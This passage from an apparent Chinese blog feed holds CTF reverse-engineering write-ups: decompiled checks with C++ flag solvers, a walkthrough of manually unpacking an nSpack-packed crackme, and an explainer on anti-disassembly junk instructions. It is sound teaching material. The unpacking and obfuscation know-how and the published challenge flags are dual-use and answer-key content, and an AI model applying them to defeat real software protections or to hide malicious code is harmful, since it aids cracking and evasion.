class="hljs-built_in">puts</span>(<span class="hljs-string">"Your Length is Wrong"</span>);</span><br><span class="line">  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt; key; i += <span class="hljs-number">3</span> )</span><br><span class="line">  {</span><br><span class="line">    v5[i] = key ^ (a1[i] + <span class="hljs-number">6</span>);</span><br><span class="line">    v4[i + <span class="hljs-number">1</span>] = (a1[i + <span class="hljs-number">1</span>] - <span class="hljs-number">6</span>) ^ key;</span><br><span class="line">    v3[i + <span class="hljs-number">2</span>] = a1[i + <span class="hljs-number">2</span>] ^ <span class="hljs-number">6</span> ^ key;</span><br><span class="line">    *(_BYTE *)(a2 + i) = v5[i];</span><br><span class="line">    *(_BYTE *)(a2 + i + <span class="hljs-number">1LL</span>) = v4[i + <span class="hljs-number">1</span>];</span><br><span class="line">    *(_BYTE *)(a2 + i + <span class="hljs-number">2LL</span>) = v3[i + <span class="hljs-number">2</span>];</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-keyword">return</span> a2;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>这里进行了一些运算，运算的结果要和一个已经定义的enflag字符串相同，所以很好逆，这里需要注意运算顺序，异或运算加括号，不然会先计算加减</p><figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;</span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>{</span><br><span class="line">    <span class="hljs-keyword">int</span> key = <span class="hljs-number">0x12</span>;</span><br><span class="line">    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> a2[] =</span><br><span class="line">            {</span><br><span class="line">                    <span class="hljs-number">0x69</span>, <span class="hljs-number">0x7A</span>, <span class="hljs-number">0x77</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x72</span>, <span class="hljs-number">0x6F</span>, <span class="hljs-number">0x7A</span>, <span class="hljs-number">0x22</span>, <span class="hljs-number">0x22</span>, <span class="hljs-number">0x77</span>,</span><br><span class="line">                    <span class="hljs-number">0x22</span>, <span class="hljs-number">0x76</span>, <span class="hljs-number">0x2E</span>, <span class="hljs-number">0x4B</span>, <span class="hljs-number">0x22</span>, <span class="hljs-number">0x2E</span>, <span class="hljs-number">0x4E</span>, <span class="hljs-number">0x69</span></span><br><span class="line">            };</span><br><span class="line">    <span class="hljs-keyword">char</span> a1[key+<span class="hljs-number">1</span>];</span><br><span class="line">    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; key; i += <span class="hljs-number">3</span> )</span><br><span class="line">    {</span><br><span class="line">        a1[i]=(a2[i]^key)<span class="hljs-number">-6</span>;</span><br><span class="line">        a1[i+<span class="hljs-number">1</span>]=(a2[i+<span class="hljs-number">1</span>]^key)+<span class="hljs-number">6</span>;</span><br><span class="line">        a1[i+<span class="hljs-number">2</span>]=a2[i+<span class="hljs-number">2</span>]^key^<span class="hljs-number">6</span>;</span><br><span class="line">    }</span><br><span class="line">    cout&lt;&lt;a1&lt;&lt;endl;</span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>输出的flag为：</p><figure class="highlight apache hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-attribute">unctf</span>{b<span class="hljs-number">66</span>_<span class="hljs-number">6</span>b<span class="hljs-number">6</span>_<span class="hljs-number">66</span>b}</span><br></pre></td></tr></tbody></table></figure><h4 id="Reversing-x64Elf-100"><a href="#Reversing-x64Elf-100" class="headerlink" title="Reversing-x64Elf-100"></a>Reversing-x64Elf-100</h4><p>没什么难度，找到关键函数</p><figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">signed</span> __int64 __fastcall <span class="hljs-title">sub_4006FD</span><span class="hljs-params">(__int64 a1)</span></span></span><br><span class="line"><span class="hljs-function"></span>{</span><br><span class="line">  <span class="hljs-keyword">signed</span> <span class="hljs-keyword">int</span> i; <span class="hljs-comment">// [rsp+14h] [rbp-24h]</span></span><br><span class="line">  <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *v3; <span class="hljs-comment">// [rsp+18h] [rbp-20h]</span></span><br><span class="line">  <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *v4; <span class="hljs-comment">// [rsp+20h] [rbp-18h]</span></span><br><span class="line">  <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *v5; <span class="hljs-comment">// [rsp+28h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v3 = <span class="hljs-string">"Dufhbmf"</span>;</span><br><span class="line">  v4 = <span class="hljs-string">"pG`imos"</span>;</span><br><span class="line">  v5 = <span class="hljs-string">"ewUglpt"</span>;</span><br><span class="line">  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">11</span>; ++i )</span><br><span class="line">  {</span><br><span class="line">    <span class="hljs-keyword">if</span> ( (&amp;v3)[i % <span class="hljs-number">3</span>][<span class="hljs-number">2</span> * (i / <span class="hljs-number">3</span>)] - *(<span class="hljs-keyword">char</span> *)(i + a1) != <span class="hljs-number">1</span> )</span><br><span class="line">      <span class="hljs-keyword">return</span> <span class="hljs-number">1LL</span>;</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>a1就是我们需要的flag了</p><figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>{</span><br><span class="line">    <span class="hljs-keyword">char</span> v3[<span class="hljs-number">3</span>][<span class="hljs-number">8</span>] = {<span class="hljs-string">"Dufhbmf"</span>, <span class="hljs-string">"pG`imos"</span>, <span class="hljs-string">"ewUglpt"</span>};</span><br><span class="line">    <span class="hljs-keyword">char</span> a1[<span class="hljs-number">13</span>];</span><br><span class="line">    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">11</span>; ++i) {</span><br><span class="line">        a1[i] = v3[i % <span class="hljs-number">3</span>][<span class="hljs-number">2</span> * (i / <span class="hljs-number">3</span>)] - <span class="hljs-number">1</span>;</span><br><span class="line">    }</span><br><span class="line">    cout&lt;&lt;a1&lt;&lt;endl;</span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>输出的flag为：</p><figure class="highlight ebnf hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-attribute">Code_Talkers</span></span><br></pre></td></tr></tbody></table></figure></body></html>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> re </tag>
            
            <tag> 攻防世界 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界-crackme-wp（手动脱壳）</title>
      <link href="/2020/02/20/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-crackme-wp%EF%BC%88%E6%89%8B%E5%8A%A8%E8%84%B1%E5%A3%B3%EF%BC%89/"/>
      <url>/2020/02/20/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-crackme-wp%EF%BC%88%E6%89%8B%E5%8A%A8%E8%84%B1%E5%A3%B3%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><p>这里以攻防世界的一道简单的题目来记录一下手动脱壳相关内容，其实理解了原理之后也是非常简单的一件事。</p><span id="more"></span><p>首先看看攻防世界的这道crackme。</p><h4 id="查壳"><a href="#查壳" class="headerlink" title="查壳"></a>查壳</h4><p>PEiD查一查，发现有壳，nSpack，并不是常见的upx，也懒得去找工具，这样一道简单的题目肯定不会用很复杂的壳，所以开始徒手脱壳。</p><p><img src="https://s2.ax1x.com/2020/02/20/3eQuwV.png" alt="crackme-1"></p><h4 id="找OEP"><a href="#找OEP" class="headerlink" title="找OEP"></a>找OEP</h4><p>手动脱壳的第一步，就是要找到程序的OEP，就是真正的程序入口点。这个要从壳的原理说起，所谓的压缩壳、加密壳，作用都是要隐藏程序真正的入口点，在壳加载的过程中对数据进行解压和解密并放到相应的段，然后壳的作用就结束了，这个时候会从壳进入真正的程序，这个时候会有一个真正的程序入口，就是OEP，不管脱什么壳，首先都是要找到OEP。</p><p>首先OD打开调试（不管用什么调试都差不多，IDA也是可以的，并且也有相应的Dump脚本，过程上没什么太大的差别）</p><p><img src="https://s2.ax1x.com/2020/02/20/3eJESU.png" alt="crackme-2"></p><p>首先看到<code>pushfd</code>和<code>pushad</code>两条命令，这是记录所有寄存器，这里我根据<em>esp定律</em>，实际上也就是堆栈平衡的原理，在执行完<code>pushad</code>之后对<code>esp</code>下断点</p><p><img src="https://s2.ax1x.com/2020/02/20/3eJFYV.png" alt="crackme-3"></p><p>下面简单介绍一下<em>esp定律</em>：</p><blockquote><p>一般的加壳软件在执行时，首先要初始化，保存环境（保存各个寄存器的值），一般利用<code>pushad</code>（相当于把<code>eax,ecx,edx,ebx,esp,ebp,esi,edi</code>都压栈），当加壳程序的外壳执行完毕以后，再来恢复各个寄存器的内容，通常会用POPAD（相当与把刚刚保存的寄存器的值都还原），在脱壳的时候，我们可以根据堆栈平衡来对ESP进行下断，进而快速到达OEP</p></blockquote><p>使用硬件读断点（<code>hw esp</code>），这里只经过了两次跳转，然后就来到了OEP附近，这里也需要注意，OEP处的<code>esp</code>并不一定是之前记录的值，但是一定很近了，这个时候需要耐心的寻找疑似的OEP。这里的OEP我找到实在<code>0x401000</code>处</p><p><img src="https://s2.ax1x.com/2020/02/20/3eJkWT.png" alt="crackme-4"></p><p>这里显然就是程序真正的入口。还有一点需要注意，壳加载过程中会加载代码，所以如果遇到没有解析的数据，就<code>Ctrl+A</code>重新分析代码。</p><h4 id="Dump"><a href="#Dump" class="headerlink" title="Dump"></a>Dump</h4><p>接下来要把内存中的完整程序Dump出来，好像OD有相关的插件，但我还是喜欢LordPE，使用也很简单，就是注意右键进程，修正镜像大小，因为有人会改镜像的大小，Dump出来的程序会有问题，所以一般不去判断，直接先修正，再Dump</p><h4 id="修正IAT"><a href="#修正IAT" class="headerlink" title="修正IAT"></a>修正IAT</h4><p>这个时候Dump出来的程序时没法运行的，因为缺少了很关键的一部分内容，就是IAT，也就是输入表，我们可以把现在Dump出来的程序用IDA打开，可以看到<code>printf</code>和<code>scanf</code>之类的函数都识别不出来，这就是因为我们Dump出来的程序没有输入表。至于输入表是什么，偷懒从百度百科抄了过来，这是PE结构中很重要的一部分。</p><blockquote><p>Import Address Table 由于导入函数就是被程序调用但其执行代码又不在程序中的函数，这些函数的代码位于一个或者多个DLL 中。当PE 文件被装入内存的时候，Windows 装载器才将DLL 装入，并将调用导入函数的指令和函数实际所处的地址联系起来(动态连接)，这操作就需要导入表完成.其中导入地址表就指示函数实际地址。</p></blockquote><p>IAT当然可以自己动手改Dump出来的程序的16进制，但是我还是喜欢用ImportREC（明明有工具为什么还要自己动手……还容易写错）。</p><p><img src="https://s2.ax1x.com/2020/02/20/3ewXrT.png" alt="crackme-5"></p><p>使用起来很简单，首先要把我们知道的OEP地址输入进去，注意这里是偏移地址，然后可以选择<code>IAT Autosearch</code>选项，但有的时候可能会不准确，这个时候可以手动寻找，RVA就是相对虚拟地址，Size就是大小，手动找的过程也很简单，只要找到调用的函数的部分，比如说<code>printf</code>，就可以在汇编代码里看到调用的地址，比如说<code>dword ptr [402094]</code>，这是个间接取址，这里取的是<code>402094</code>处指针指向的地址，这里才是真正的<code>printf</code>函数的入口，我们转到<code>402094</code>的位置，可以看到上下都有很多这样的指针，指向外部引用的函数，这里就是输入表</p><p><img src="https://s2.ax1x.com/2020/02/20/3erkMq.png" alt="crackme-6"></p><p>两个不同的dll中间用0隔开，所以找到开始地址和结束地址，就能知道RVA和Size。</p><p>这个时候点<code>Get Imports</code>，中间窗口会显示出来，但是注意有时候会出现无效的值，这个时候可能需要手动修复或者是删除，如果全都显示有效，就可以<code>Fix Dump</code>，选择刚刚Dump出来的文件，成功的话会生成一个新的文件，这个文件是可以执行的程序，到这里脱壳的过程就结束了。</p><h4 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h4><p>回到题目本身，IDA打开</p><figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">signed</span> <span class="hljs-keyword">int</span> <span class="hljs-title">start</span><span class="hljs-params">()</span></span></span><br><span class="line"><span class="hljs-function"></span>{</span><br><span class="line">  <span class="hljs-keyword">signed</span> <span class="hljs-keyword">int</span> result; <span class="hljs-comment">// eax</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v1; <span class="hljs-comment">// eax</span></span><br><span class="line">  <span class="hljs-keyword">char</span> Buf; <span class="hljs-comment">// [esp+4h] [ebp-38h]</span></span><br><span class="line">  <span class="hljs-keyword">char</span> Dst; <span class="hljs-comment">// [esp+5h] [ebp-37h]</span></span><br><span class="line"></span><br><span class="line">  Buf = <span class="hljs-number">0</span>;</span><br><span class="line">  <span class="hljs-built_in">memset</span>(&amp;Dst, <span class="hljs-number">0</span>, <span class="hljs-number">0x31</span>u);</span><br><span class="line">  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Please Input Flag:"</span>);</span><br><span class="line">  <span class="hljs-built_in">gets_s</span>(&amp;Buf, <span class="hljs-number">0x2C</span>u);</span><br><span class="line">  <span class="hljs-keyword">if</span> ( <span class="hljs-built_in">strlen</span>(&amp;Buf) == <span class="hljs-number">42</span> )</span><br><span class="line">  {</span><br><span class="line">    v1 = <span class="hljs-number">0</span>;</span><br><span class="line">    <span class="hljs-keyword">while</span> ( (*(&amp;Buf + v1) ^ byte_402130[v1 % <span class="hljs-number">16</span>]) == dword_402150[v1] )</span><br><span class="line">    {</span><br><span class="line">      <span class="hljs-keyword">if</span> ( ++v1 &gt;= <span class="hljs-number">42</span> )</span><br><span class="line">      {</span><br><span class="line">        <span class="hljs-built_in">printf</span>(<span class="hljs-string">"right!\n"</span>);</span><br><span class="line">        <span class="hljs-keyword">goto</span> LABEL_8;</span><br><span class="line">      }</span><br><span class="line">    }</span><br><span class="line">    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"error!\n"</span>);</span><br><span class="line">LABEL_8:</span><br><span class="line">    result = <span class="hljs-number">0</span>;</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-keyword">else</span></span><br><span class="line">  {</span><br><span class="line">    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"error!\n"</span>);</span><br><span class="line">    result = <span class="hljs-number">-1</span>;</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-keyword">return</span> result;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>发现程序的判断非常简单，可见这题的主要目的是为了考脱壳，把需要的数据导出之后，直接简单逆向输出flag</p><figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>{</span><br><span class="line">    <span class="hljs-keyword">int</span> dword_402150[] = { <span class="hljs-number">18</span>, <span class="hljs-number">4</span>, <span class="hljs-number">8</span>, <span class="hljs-number">20</span>, <span class="hljs-number">36</span>, <span class="hljs-number">92</span>, <span class="hljs-number">74</span>, <span class="hljs-number">61</span>, <span class="hljs-number">86</span>, <span class="hljs-number">10</span>, <span class="hljs-number">16</span>, <span class="hljs-number">103</span>, <span class="hljs-number">0</span>, <span class="hljs-number">65</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">70</span>, <span class="hljs-number">90</span>, <span class="hljs-number">68</span>, <span class="hljs-number">66</span>, <span class="hljs-number">110</span>, <span class="hljs-number">12</span>, <span class="hljs-number">68</span>, <span class="hljs-number">114</span>, <span class="hljs-number">12</span>, <span class="hljs-number">13</span>, <span class="hljs-number">64</span>, <span class="hljs-number">62</span>, <span class="hljs-number">75</span>, <span class="hljs-number">95</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>, <span class="hljs-number">76</span>, <span class="hljs-number">94</span>, <span class="hljs-number">91</span>, <span class="hljs-number">23</span>, <span class="hljs-number">110</span>, <span class="hljs-number">12</span>, <span class="hljs-number">22</span>, <span class="hljs-number">104</span>, <span class="hljs-number">91</span>, <span class="hljs-number">18</span>};</span><br><span class="line">    <span class="hljs-keyword">char</span> aThisIsNotFlag[] =</span><br><span class="line">            <span class="hljs-string">"this_is_not_flag"</span>;</span><br><span class="line">    string flag;</span><br><span class="line">    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i =<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">42</span>;i++)</span><br><span class="line">    {</span><br><span class="line">        flag+=(dword_402150[i]^aThisIsNotFlag[i%<span class="hljs-number">16</span>]);</span><br><span class="line">    }</span><br><span class="line">    cout&lt;&lt;flag&lt;&lt;endl;</span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;</span><br><span class="line">}</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>输出得到flag</p><figure class="highlight apache hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-attribute">flag</span>{<span class="hljs-number">59</span>b<span class="hljs-number">8</span>ed<span class="hljs-number">8</span>f-af<span class="hljs-number">22</span>-<span class="hljs-number">11</span>e<span class="hljs-number">7</span>-bb<span class="hljs-number">4</span>a-<span class="hljs-number">3</span>cf<span class="hljs-number">862</span>d<span class="hljs-number">1</span>ee<span class="hljs-number">75</span>}</span><br></pre></td></tr></tbody></table></figure></body></html>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> re </tag>
            
            <tag> 攻防世界 </tag>
            
            <tag> 脱壳 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>花指令</title>
      <link href="/2020/02/19/%E8%8A%B1%E6%8C%87%E4%BB%A4/"/>
      <url>/2020/02/19/%E8%8A%B1%E6%8C%87%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><p>这里写一下有关花指令的内容，自己的理解也很有限，只能以后再多学学再补充，现在只能把自己知道的写下来。  </p><span id="more"></span><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>首先反汇编有一个很关键的问题，就是怎么样区分数据和代码，由于x86和x64架构的每条指令是不等长的，区分数据和代码就变得很困难，反汇编的算法必须要对汇编指令长度和各种各样的跳转进行适当的处理，不然就会发生错误，导致反汇编失败，这也是花指令的作用。  </p><p>目前主要的反汇编算法主要还是线性扫描*(Linear Sweep)<em>和较高级的递归行进</em>(Recursive Traversal)*，目前我比较常用的就是OD和IDA，它们的工作原理列在下面，此外还尝试了Ghidra，这个工具比较神奇，可以在有花指令的情况下抛掉很多无用的指令，反汇编出函数的大概，目前工作的原理还没有详细地了解，这里先提一下，了解之后再补充。</p><blockquote><p>线性扫描本身的技术含量不是很高，反汇编工具将整个模块中的每一条指令都反汇编成汇编指令，每一个遇到的机器码都会当作汇编指令处理（不加判断），所以线性扫描根本不能把代码和数据区分开来，而一旦一条指令开始出错，整个反汇编都开始出错。</p></blockquote><blockquote><p>递归行进算法相较于线性扫描算法更灵活一些，它是按照代码可能的执行顺序来反汇编程序，每条可能的路径来扫描，解码出分支之后会记录这个地址，分别反汇编各个分支中的指令，这样按照路径进行搜寻，可以有效避免将数据识别成指令的问题。  </p></blockquote><table><thead><tr><th>工具</th><th>算法</th></tr></thead><tbody><tr><td>OllyDbg</td><td>Linear Sweep/Recursive Traversal(Ctrl+A)</td></tr><tr><td>IDA Pro</td><td>Recursive Traversal</td></tr><tr><td>Ghidra</td><td></td></tr></tbody></table><p>但是我们可以通过巧妙地构造代码和数据，插入一些<em>“花指令”</em>，以此干扰反汇编软件。因为前面提到的不同的机器指令包含的字节数不同地原因，所有的多字节指令只有正确识别第一个字节，也就是操作码，才能正确实现反汇编，否则就会识别成完全不同的另一条指令。</p><p>而迷惑递归行进算法还需要多动动脑子，一两个简单的垃圾数据不会使递归行进算法失效，但是，个人理解，在递归行进算法中，任意的控制转移指令，其后的地址都认为是有效的，因为递归行进算法中最重要的就是通过跳转来确定分支，因此，我们可以利用跳转来实现我们想要的<em>“花指令”</em>。</p><h4 id="常见花指令"><a href="#常见花指令" class="headerlink" title="常见花指令"></a>常见花指令</h4><ul><li><p><code>jx &amp; jnx</code></p><p>比如说这样一段代码</p></li></ul><figure class="highlight plaintext hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">text:00401065jz short near ptr loc_40107C</span><br><span class="line">text:00401067jnz short near ptr loc_40107C</span><br><span class="line">text:00401069</span><br><span class="line">text:00401069 loc_401069:</span><br><span class="line">text:00401069db 36h  ;junk code here</span><br><span class="line">text:0040107C……</span><br></pre></td></tr></tbody></table></figure><p>​    这里只是一个随便编写的例子，但是差不多所有的处理都是这个样子，两个互补指令代替了一个强制跳转，但是在IDA这里，没有成功跳转的分支也是默认有效的，所以会去解析<code>junk code</code>，后面的指令也就跟着出错了。</p><ul><li><p><code>call+pop/(add esp)+return</code></p><p>比如说这样的代码</p><figure class="highlight plaintext hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">text:0040103Bcall loc_401042</span><br><span class="line">  text:0040103B sub_401022endp;sp-analysis failed</span><br><span class="line">  text:0040103B</span><br><span class="line">  text:00401040cmp cl,dl</span><br><span class="line">  text:00401042</span><br><span class="line">  text:00401042 loc_401042:</span><br><span class="line">  text:00401042add esp,4</span><br></pre></td></tr></tbody></table></figure><p><code>call</code>指令相当于<code>jmp</code>+<code>push eip</code>，所以用<code>add esp,4</code>指令可以消除入栈的<code>eip</code>的影响，此时<code>call</code>就相当于<code>jmp</code>，但是IDA还是会把<code>0x401042</code>当作新函数的首地址，所以当前函数的识别就会出错，IDA会找不到结束位置，因此没法继续反汇编。</p></li><li><p><code>jx</code></p><p>这一类理解起来也蛮简单的，就是<code>jmp</code>到一个IDA无法解析的位置，比如说下面这段</p><figure class="highlight plaintext hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000004009F5 loc_4009F5:                             </span><br><span class="line">.text:00000000004009F5                 jmp     short near ptr loc_4009FB+1</span><br><span class="line">;---------------------------------------------------------------------------</span><br><span class="line">;从这里开始</span><br><span class="line">.text:00000000004009F7                 xor     eax, eax</span><br><span class="line">.text:00000000004009F9                 jz      short loc_4009F5</span><br><span class="line">.text:00000000004009FB</span><br><span class="line">.text:00000000004009FB loc_4009FB:                             </span><br><span class="line">.text:00000000004009FB                 call    near ptr 0C59748h</span><br></pre></td></tr></tbody></table></figure><p>最下面这个<code>0c59748</code>的地址显然是无效的，这里肯定是出了问题，仔细观察一下代码，<code>xor  eax, eax</code>这句得到的是0，所以下一个跳转是一定可以实现的，但是IDA判断不出来，他会对所有可能的分支进行解析，所以会从<code>0x4009FB</code>出开始解析新的命令，然后这个跳转并不存在，就会提示地址不存在，但是真正让反汇编进行不下去的是接下来的操作，另一条可能的路径，即正常的执行流程，进入到<code>0x4009F5</code>之后跳转到了<code>0x4009FC</code>的位置，但是这里已经解析过了，被一条假的命令占用了，IDA就会停止反汇编，然后报错。</p></li><li><p><code>call</code>+一些巧妙的处理</p><p>最近比赛的时候见到了一个很不错的花指令，可以学习一下，在<code>call</code>指令之后写入一些<code>junk code</code>，然后在调用的函数中对返回地址进行处理跳过<code>junk code</code>，详细的过程在<a href="https://rycbar77.github.io/2020/03/30/MRCTF-wp/#junk">这里</a></p></li></ul><h4 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h4><p>写花指令的方式实在太多，也有很多很有创意的花指令，记录是记录不完的，但是只要掌握的原理，跟着程序的流程走，都不会有太大的难度，熟练了以后可以尝试使用脚本去除花指令。</p></body></html>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> re </tag>
            
            <tag> 花指令 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hgame_wp</title>
      <link href="/2020/01/25/hgame-wp/"/>
      <url>/2020/01/25/hgame-wp/</url>
      
